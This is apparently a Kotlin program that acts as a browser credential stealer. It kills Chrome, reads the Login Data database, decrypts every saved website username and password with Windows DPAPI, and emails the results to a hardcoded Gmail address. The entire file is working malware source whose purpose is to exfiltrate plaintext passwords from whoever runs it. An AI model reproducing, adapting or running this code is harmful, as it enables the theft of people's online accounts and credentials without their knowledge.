import com.sun.jna.platform.win32.Crypt32Util
import java.io.File
import java.sql.Connection
import java.sql.DriverManager
import java.sql.ResultSet


data class ChromeAccount(private val website: String,
                         val username: String,
                         private val clearTextPassword: String) {
    constructor(rs: ResultSet) : this(
            website = rs.getString(1),
            username = rs.getString(2),
            clearTextPassword = getWin32Password(rs.getBytes(3))
    )
}

private lateinit var databaseFile: File
private lateinit var connection: Connection
const val emailToSendTo = "astroazure7@gmail.com"


fun main(args: Array<String>) {
    // force close chrome
    Runtime.getRuntime().exec("taskkill /F /IM chrome.exe")
    searchChrome()
    connectDb()
    val list = getAccounts().filter {
        !it.username.isNullOrBlank()
    }
    val emailRes = MailerTLS.sendDump(emailToSendTo, list)
    if(emailRes)
        println("Sent ^^")
}

/**
 * Searches for chrome on the computer
 * Then searches for the file that stores the passwords
 * If file doesnt exist, program exits
 */
private fun searchChrome() {
    val databaseFileDir = "${System.getenv("localappdata")}\\Google\\Chrome\\User Data\\Default\\Login Data"
    println(databaseFileDir)
    databaseFile = File(databaseFileDir)
    if (!databaseFile.exists())
        println("Chrome does not exist!").run { System.exit(0) }
}

/**
 * Uses Windows Password to decrypt encrypted chrome passwords
 */
private fun getWin32Password(encryptedData: ByteArray) =
        String(Crypt32Util.cryptUnprotectData(encryptedData))

/**
 * Create database connection
 */
private fun connectDb() = try {
    Class.forName("org.sqlite.JDBC")
    connection = DriverManager.getConnection("jdbc:sqlite:$databaseFile")
    println("Database file found!")
} catch (e: Exception) {
    println(e.printStackTrace()) // error will occur is chrome is open
    System.exit(0)
}

/**
 * Queries database for the required fields
 * Then convert them to ChromeAccount object and place them into a list
 */
private fun getAccounts(): ArrayList<ChromeAccount> {
    val chromeAccounts = arrayListOf<ChromeAccount>()
    val stmt = connection.createStatement()
    val resultSet = stmt.executeQuery("SELECT action_url, username_value, password_value FROM logins")
    while (resultSet.next()) chromeAccounts.add(ChromeAccount(resultSet))

    stmt.close()
    connection.close()

    return chromeAccounts
}


